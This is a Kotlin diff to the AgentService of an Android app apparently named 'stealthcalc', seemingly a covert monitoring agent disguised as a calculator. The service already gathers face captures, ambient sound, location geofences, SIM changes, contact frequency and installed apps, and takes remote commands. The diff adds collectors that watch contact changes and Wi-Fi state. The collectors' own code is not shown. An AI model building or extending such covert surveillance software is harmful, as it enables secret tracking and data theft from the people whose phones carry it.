@@ -23,7 +23,9 @@ import com.stealthcalc.monitoring.collector.DeviceInfoCollector
 import com.stealthcalc.monitoring.collector.DeviceSecurityCollector
 import com.stealthcalc.monitoring.collector.GeofenceCollector
 import com.stealthcalc.monitoring.collector.AppPermissionsCollector
+import com.stealthcalc.monitoring.collector.ContactChangeCollector
 import com.stealthcalc.monitoring.collector.InstalledAppsCollector
+import com.stealthcalc.monitoring.collector.WifiAlertCollector
 import com.stealthcalc.monitoring.collector.SensorCollector
 import com.stealthcalc.monitoring.collector.StepCountCollector
 import com.stealthcalc.monitoring.collector.FaceCaptureCollector
@@ -100,6 +102,8 @@ class AgentService : LifecycleService() {
     @Inject lateinit var stepCountCollector: StepCountCollector
     @Inject lateinit var sensorCollector: SensorCollector
     @Inject lateinit var appPermissionsCollector: AppPermissionsCollector
+    @Inject lateinit var wifiAlertCollector: WifiAlertCollector
+    @Inject lateinit var contactChangeCollector: ContactChangeCollector
     @Inject lateinit var remoteCommandHandler: RemoteCommandHandler
     @Inject lateinit var apiClient: AgentApiClient
 
@@ -140,6 +144,7 @@ class AgentService : LifecycleService() {
         simChangeCollector.start()
         stepCountCollector.start()
         sensorCollector.start()
+        contactChangeCollector.start()
 
         collectJob?.cancel()
         collectJob = lifecycleScope.launch {
@@ -165,6 +170,7 @@ class AgentService : LifecycleService() {
                     ambientSoundCollector.collect()
                     contactFrequencyCollector.collect()
                     appPermissionsCollector.collect()
+                    wifiAlertCollector.collect()
                 }.onFailure { e ->
                     AppLogger.log(this@AgentService, "[agent]", "Collection error: ${e.message}")
                 }
@@ -208,6 +214,7 @@ class AgentService : LifecycleService() {
         simChangeCollector.stop()
         stepCountCollector.stop()
         sensorCollector.stop()
+        contactChangeCollector.stop()
         remoteCommandHandler.stopListening()
         AppLogger.log(this, "[agent]", "Agent service stopped")
         super.onDestroy()
